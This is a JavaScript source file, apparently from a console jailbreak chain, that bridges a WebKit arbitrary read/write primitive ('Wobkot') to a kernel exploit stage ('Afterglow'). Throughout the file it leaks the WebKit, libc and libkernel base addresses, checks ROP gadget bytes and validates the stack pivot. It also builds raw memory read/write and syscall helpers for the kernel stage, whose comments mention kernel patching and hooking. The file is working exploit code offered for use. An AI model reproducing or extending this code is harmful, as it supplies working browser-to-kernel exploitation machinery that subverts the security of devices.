// Adapter between Wobkot's WebKit primitive and Afterglow's kernel stage.
//
// Wobkot gives us:
//   arw        arbitrary read/write in the WebProcess
//   fn         NativeFunction (ROP-backed syscalls)
//   mem        userland allocations / copies
//   syscalls   libkernel syscall stubs found by Wobkot
//
// Afterglow's kernel exploit only needs four things from its host:
//   sc(num, ...args)       syscall, returns {lo, hi, i32}
//   bufAddr(arrayBuffer)   backing-store address of an ArrayBuffer
//   p.read1/2/4/8          process memory reads
//   p.write1/2/4/8         process memory writes
//   p.readInto(u8, at, n)  bulk read
//   keepAlive              array that keeps allocations alive
//
// We build that surface on top of Wobkot, then validate every WebKit address
// we are about to use. A failed validation stops before the first ROP call and
// the page can fall back to the proven Afterglow engine.

const AFTERGLOW_CRITICAL_GADGETS = [
  ['wk_POP_RAX_RET', [0x58, 0xc3]],
  ['wk_POP_RDI_RET', [0x5f, 0xc3]],
  ['wk_POP_RSI_RET', [0x5e, 0xc3]],
  ['wk_POP_RDX_RET', [0x5a, 0xc3]],
  ['wk_POP_RCX_RET', [0x59, 0xc3]],
  ['wk_POP_R8_RET', [0x41, 0x58, 0xc3]],
  ['wk_POP_R9_RET', [0x41, 0x59, 0xc3]],
  ['wk_POP_RBP_RET', [0x5d, 0xc3]],
  ['wk_POP_RSP_RET', [0x5c, 0xc3]],
  ['wk_LEAVE_RET', [0xc9, 0xc3]],
  ['wk_MOV_QWORD_PTR_RDI_RAX_RET', [0x48, 0x89, 0x07, 0xc3]],
];

const AFTERGLOW_OPTIONAL_GADGETS = [
  ['wk_POP_RBX_RET', [0x5b, 0xc3]],
  ['wk_MOV_RAX_QWORD_PTR_RDI_RET', [0x48, 0x8b, 0x07, 0xc3]],
  ['wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX', [0xff, 0x33, 0xff, 0x20]],
];

// Syscalls Afterglow asks for. Missing entries are a warning, not a hard fail:
// Afterglow's own seedStubs() gets one more chance to find them in libkernel.
const AFTERGLOW_SYSCALLS = [5, 6, 54, 74, 97, 105, 24, 362, 363, 477, 432, 20, 202, 487, 488, 592, 593];

function afterglow_to_bint(value) {
  if (value instanceof BInt) return value;

  if (typeof value === 'number') return new BInt(value);

  if (value && typeof value.low === 'number' && typeof value.hi === 'number') {
    return new BInt(value.hi, value.low);
  }

  if (value && typeof value.lo === 'number' && typeof value.hi === 'number') {
    return new BInt(value.hi, value.lo);
  }

  throw new TypeError(`Cannot convert ${value} to a BInt address`);
}

function afterglow_to_i64(value) {
  const I = globalThis.AfterglowInt64;

  if (typeof I !== 'function') {
    throw new Error('Afterglow int64 is not loaded');
  }

  const b = afterglow_to_bint(value);
  return new I(b.lo, b.hi);
}

function afterglow_read_bytes(addr, len) {
  const out = new Uint8Array(len);

  for (let i = 0; i < len; i++) {
    out[i] = arw.view(addr.add(i)).getUint8(0);
  }

  return out;
}

function afterglow_hex(bytes) {
  return Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join(' ');
}

// Exercise the ARW through the same ArrayBuffer backing-store path Afterglow
// uses for bufAddr(). If this round trip fails, the primitive is not usable and
// we stop before any ROP.
function afterglow_check_arw() {
  const u8 = new Uint8Array(0x100);
  u8[0] = 0x41;
  u8[1] = 0x42;

  const at = u8.buffer.data();
  if (at.eq(0)) throw new Error('ArrayBuffer backing store is zero');

  if (arw.view(at).getUint8(0) !== 0x41) {
    throw new Error('ARW read did not return the ArrayBuffer contents');
  }

  arw.view(at).setUint8(0, 0x42);
  if (u8[0] !== 0x42) {
    throw new Error('ARW write did not reach the ArrayBuffer');
  }

  logger.info('ARW round-trip OK');
}

// Rebuild the WebKit base the same way rop.init() does, but before rop.init()
// has a chance to scan libkernel with a bad address. Returns the base.
function afterglow_precheck_webkit_base() {
  const math_expm1_addr = arw.addrof(Math.expm1);
  logger.debug(`math_expm1_addr: ${math_expm1_addr}`);

  const m_executableOrRareData = arw.view(math_expm1_addr).getBInt(0x18, true);
  logger.debug(`m_executableOrRareData: ${m_executableOrRareData}`);

  const m_function = arw.view(m_executableOrRareData).getBInt(impl.wk_JSFunction_m_function, true);
  logger.debug(`m_function: ${m_function}`);

  const base = m_function.sub(impl.wk_expm1_builtin);
  logger.debug(`webkit_base candidate: ${base}`);

  if (base.eq(0)) throw new Error('WebKit base is zero');
  if (base.and(0xfff).neq(0)) throw new Error(`WebKit base ${base} is not page aligned`);
  if (base.hi >= 0x80000000) throw new Error(`WebKit base ${base} is not a userland address`);

  return base;
}

function afterglow_validate_gadgets(base) {
  const failures = [];
  const previous_base = webkit_base;

  // The gadget properties in impl are getters that return
  // webkit_base + offset. Point webkit_base at the candidate so they resolve
  // to absolute addresses; rop.init() will set the same value again.
  webkit_base = base;

  function check(name, want, critical) {
    let addr;

    try {
      addr = impl[name];
    } catch (err) {
      const msg = `${name}: no offset (${err.message})`;
      if (critical) failures.push(msg);
      logger.warn(msg);
      return;
    }

    const got = afterglow_read_bytes(addr, want.length);
    const ok = got.every((byte, i) => byte === want[i]);
    const line = `${name} @ ${addr}: ${afterglow_hex(got)} (want ${afterglow_hex(want)})`;

    if (ok) {
      logger.debug(`ok ${line}`);
    } else if (critical) {
      failures.push(line);
      logger.error(`BAD ${line}`);
    } else {
      logger.warn(`optional mismatch ${line}`);
    }
  }

  for (const [name, want] of AFTERGLOW_CRITICAL_GADGETS) check(name, want, true);
  for (const [name, want] of AFTERGLOW_OPTIONAL_GADGETS) check(name, want, false);

  if (failures.length) {
    webkit_base = previous_base;
    throw new Error(`WebKit gadget validation failed:\n${failures.join('\n')}`);
  }

  logger.info(
    `WebKit gadgets validated: ${AFTERGLOW_CRITICAL_GADGETS.length} critical` +
      ` + ${AFTERGLOW_OPTIONAL_GADGETS.length} optional`,
  );
}

function afterglow_validate_bases(base) {
  if (!webkit_base.eq(base)) {
    throw new Error(`rop.init() moved the WebKit base from ${base} to ${webkit_base}`);
  }

  for (const [name, value] of [
    ['libc_base', libc_base],
    ['libkernel_base', libkernel_base],
  ]) {
    if (value.eq(0)) throw new Error(`${name} is zero`);
    if (value.and(0xfff).neq(0)) throw new Error(`${name} ${value} is not page aligned`);
    if (value.hi >= 0x80000000) throw new Error(`${name} ${value} is not a userland address`);
  }

  if (syscalls.size < 100) {
    throw new Error(`only ${syscalls.size} libkernel syscall stubs were found`);
  }

  const missing = AFTERGLOW_SYSCALLS.filter((id) => !syscalls.has(id));
  if (missing.length) {
    logger.warn(`libkernel stubs Wobkot did not find: ${missing.join(', ')} (Afterglow will retry)`);
  }

  logger.info(`libc base: ${libc_base}`);
  logger.info(`libkernel base: ${libkernel_base}`);
  logger.info(`libkernel syscall stubs: ${syscalls.size}`);
}

// rop.init() scans libkernel as soon as it has a base. Verify that base from
// the WebKit import table first, so a bad import offset cannot turn into a
// scan of unmapped memory.
function afterglow_precheck_kernel_bases(base) {
  const strerror_addr = arw.view(base).getBInt(impl.wk___imp_strerror, true);
  const error_addr = arw.view(base).getBInt(impl.wk___imp___error, true);

  if (strerror_addr.eq(0) || error_addr.eq(0)) {
    throw new Error('WebKit import table has no strerror/_error pointers');
  }

  const libc = strerror_addr.sub(impl.lc_strerror);
  const libkernel = error_addr.sub(impl.lk__error);

  for (const [name, value] of [
    ['libc_base', libc],
    ['libkernel_base', libkernel],
  ]) {
    if (value.eq(0)) throw new Error(`${name} precheck is zero`);
    if (value.and(0xfff).neq(0)) throw new Error(`${name} precheck ${value} is not page aligned`);
    if (value.hi >= 0x80000000) throw new Error(`${name} precheck ${value} is not a userland address`);
  }

  logger.debug(`strerror_addr: ${strerror_addr}`);
  logger.debug(`_error_addr: ${error_addr}`);
  logger.info(`libc base precheck: ${libc}`);
  logger.info(`libkernel base precheck: ${libkernel}`);

  return { libc, libkernel };
}

// rop.execute() pivots through VM::topEntryFrame. If that one offset is wrong
// the ROP write goes to a stranger's stack, so check the frame before the first
// call: the entry and the two words the pivot copies must be userland
// addresses. We deliberately do not require the saved return address to fall
// in a known module: it can legitimately be JIT code.
function afterglow_precheck_pivot() {
  const global_this_addr = arw.addrof(globalThis);
  const js_global_object_addr = arw.view(global_this_addr).getBInt(0x10, true);
  const m_vm = arw.view(js_global_object_addr).getBInt(0x38, true);

  if (m_vm.eq(0) || m_vm.and(7).neq(0) || m_vm.hi >= 0x80000000) {
    throw new Error(`VM pointer ${m_vm} is not a userland object`);
  }

  const rbp = arw.view(m_vm).getBInt(impl.wk_JSGlobalObject_m_vm_topEntryFrame, true);

  if (rbp.eq(0) || rbp.and(7).neq(0) || rbp.hi >= 0x80000000) {
    throw new Error(`topEntryFrame ${rbp} is not a userland stack address`);
  }

  const saved_ret = arw.view(rbp).getBInt(8, true);
  const saved_ptr = arw.view(rbp).getBInt(0x10, true);

  if (saved_ret.eq(0) || saved_ret.hi >= 0x80000000) {
    throw new Error(`topEntryFrame saved return ${saved_ret} is not userland`);
  }
  if (saved_ptr.eq(0) || saved_ptr.hi >= 0x80000000) {
    throw new Error(`topEntryFrame saved pointer ${saved_ptr} is not userland`);
  }

  logger.info(
    `ROP pivot precheck: topEntryFrame ${rbp}, saved ret ${saved_ret}, saved ptr ${saved_ptr}`,
  );
}

function make_afterglow_ctx(options) {
  const opts = options || {};
  const I = globalThis.AfterglowInt64;

  if (typeof I !== 'function') {
    throw new Error('Afterglow int64 is not loaded');
  }

  const native_cache = new Map();
  const keepAlive = [];

  function native_for(addr) {
    const b = afterglow_to_bint(addr);
    const key = b.toString();

    let f = native_cache.get(key);
    if (!f) {
      f = new NativeFunction(b, 'bint');
      native_cache.set(key, f);
    }

    return f;
  }

  function to_arg(value) {
    if (value === undefined || value === null) return 0;
    if (value instanceof BInt) return value;
    if (typeof value === 'number' || typeof value === 'boolean') return value;
    if (value && typeof value.low === 'number' && typeof value.hi === 'number') {
      return new BInt(value.hi, value.low);
    }
    throw new TypeError(`Unsupported Afterglow argument ${value}`);
  }

  function callAddr(addr, args) {
    const f = native_for(addr);
    const result = f.invoke(...(args || []).map(to_arg));

    return {
      lo: result.lo,
      hi: result.hi,
      i32: result.lo | 0,
    };
  }

  const p = {
    read1(at) {
      return arw.view(afterglow_to_bint(at)).getUint8(0);
    },
    read2(at) {
      return arw.view(afterglow_to_bint(at)).getUint16(0, true);
    },
    read4(at) {
      return arw.view(afterglow_to_bint(at)).getUint32(0, true);
    },
    read8(at) {
      const b = arw.view(afterglow_to_bint(at)).getBInt(0, true);
      return new I(b.lo, b.hi);
    },
    write1(at, value) {
      arw.view(afterglow_to_bint(at)).setUint8(0, value & 0xff);
    },
    write2(at, value) {
      arw.view(afterglow_to_bint(at)).setUint16(0, value & 0xffff, true);
    },
    write4(at, value) {
      arw.view(afterglow_to_bint(at)).setUint32(0, value >>> 0, true);
    },
    write8(at, value) {
      arw.view(afterglow_to_bint(at)).setBInt(0, afterglow_to_bint(value), true);
    },
    readInto(u8, at, len) {
      const dst = u8.buffer.data().add(u8.byteOffset);
      mem.copy(dst, afterglow_to_bint(at), len);
    },
  };

  const ctx = {
    fw: opts.fw,
    params: opts.params,
    state: opts.state || {},
    keepAlive,
    p,
    callAddr,
    stubAddr: syscalls,
    webkitBase: afterglow_to_i64(webkit_base),
    libkernelBase: afterglow_to_i64(libkernel_base),
    off: { k_scan_stage1: 0x40000 },
    bufAddr(ab) {
      let b;

      if (ab instanceof ArrayBuffer) {
        b = ab.data();
      } else if (ArrayBuffer.isView(ab)) {
        b = ab.buffer.data().add(ab.byteOffset);
      } else {
        throw new TypeError('bufAddr expects an ArrayBuffer or a TypedArray view');
      }

      return new I(b.lo, b.hi);
    },
    mark(tag, detail) {
      const text = String(detail == null ? '' : detail);

      if (text.indexOf('the handles are NOT defused') !== -1) ctx.unsafe = true;
      if (text.indexOf('handles defused') !== -1) ctx.unsafe = false;
      if (text.indexOf('[5] widen and hook') !== -1) ctx.kernel_touched = true;
      if (text.indexOf('[6] kernel patched') !== -1) ctx.kernel_touched = true;

      logger.log(`[${tag}]`, text);
    },
    errno() {
      if (!fn.hasOwnProperty('_error')) throw new Error('_error is not available');
      return arw.view(fn._error.invoke()).getUint32(0, true);
    },
  };

  return ctx;
}

globalThis.afterglow_precheck_webkit_base = afterglow_precheck_webkit_base;
globalThis.afterglow_precheck_kernel_bases = afterglow_precheck_kernel_bases;
globalThis.afterglow_precheck_pivot = afterglow_precheck_pivot;
globalThis.afterglow_check_arw = afterglow_check_arw;
globalThis.afterglow_validate_gadgets = afterglow_validate_gadgets;
globalThis.afterglow_validate_bases = afterglow_validate_bases;
globalThis.make_afterglow_ctx = make_afterglow_ctx;
